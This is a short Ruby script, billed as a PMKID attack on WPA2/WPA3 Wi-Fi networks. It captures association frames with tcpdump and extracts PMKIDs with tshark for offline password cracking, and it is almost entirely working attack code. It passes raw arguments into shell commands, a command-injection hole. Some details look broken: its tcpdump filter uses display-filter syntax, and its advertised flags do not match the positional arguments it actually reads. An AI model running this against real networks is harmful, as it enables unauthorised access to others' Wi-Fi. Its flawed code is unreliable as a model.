#!/usr/bin/env ruby
# PMKID Attack for WPA3/WPA2
# Flags: --iface, --bssid, --timeout, --output

iface = ARGV[0] || "wlan0"
bssid = ARGV[1] || ""
timeout = (ARGV[2] || "60").to_i
output = ARGV[3] || "/tmp/pmkid_#{Time.now.to_i}.cap"

puts "[PMKID] Starting PMKID harvest on #{iface}"

filter = if bssid.empty?
  "'type mgt subtype assoc'"
else
  "'wlan.addr==#{bssid} and (type mgt subtype assoc)'"
end

cmd = "timeout #{timeout} tcpdump -i #{iface} -n -c 2000 #{filter} -w #{output} 2>/dev/null"
puts "[PMKID] Capturing association frames..."
system(cmd)

analyze = "tshark -r #{output} -Y 'wlan.rm.pmkid' -T fields " +
  "-e wlan.sa -e wlan.da -e wlan.rm.pmkid 2>/dev/null"
result = `#{analyze}`
lines = result.lines.count
if lines > 0
  puts "[PMKID] Found #{lines} PMKID(s):"
  puts result
else
  puts "[PMKID] No PMKID found. Try with more clients or different channel."
end

puts "[PMKID] Capture saved: #{output}"
